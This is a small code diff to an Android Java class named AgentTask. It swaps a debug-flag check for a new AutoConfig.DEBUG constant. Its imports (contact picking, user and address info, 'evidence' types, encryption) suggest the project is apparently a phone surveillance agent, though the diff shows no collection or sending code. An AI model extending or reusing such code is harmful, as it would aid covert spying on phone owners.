@@ -29,6 +29,7 @@ import com.android.service.agent.task.PickContact;
 import com.android.service.agent.task.PostalAddressInfo;
 import com.android.service.agent.task.UserInfo;
 import com.android.service.agent.task.WebsiteInfo;
+import com.android.service.auto.AutoConfig;
 import com.android.service.conf.Configuration;
 import com.android.service.crypto.Encryption;
 import com.android.service.evidence.EvidenceType;
@@ -212,7 +213,7 @@ public class AgentTask extends AgentBase {
 				outputStream.write(Utils.intToByteArray(header));
 				outputStream.write(WChar.getBytes(name, false));
 			} catch (IOException e) {
-				if(Configuration.isDebug()) { e.printStackTrace(); }
+				if(AutoConfig.DEBUG) { e.printStackTrace(); }
 				Log.d("QZ", TAG + " Error (addTypedString): " + e);
 			}
 		}
